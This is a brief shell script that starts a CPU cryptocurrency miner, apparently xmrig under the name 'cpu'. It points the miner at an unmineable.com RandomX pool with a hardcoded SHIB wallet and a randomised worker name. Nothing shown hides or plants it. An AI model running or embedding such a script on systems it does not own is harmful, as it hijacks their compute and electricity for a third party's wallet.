 

POOL=rx.unmineable.com:3333

WALLET=SHIB:0xb13f91835c32249e1506da1201e937d666652725

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-CPU-MJ)

chmod +x cpu

./cpu --donate-level 1 -o $POOL -u $WALLET.$WORKER -p x -k -a rx/0
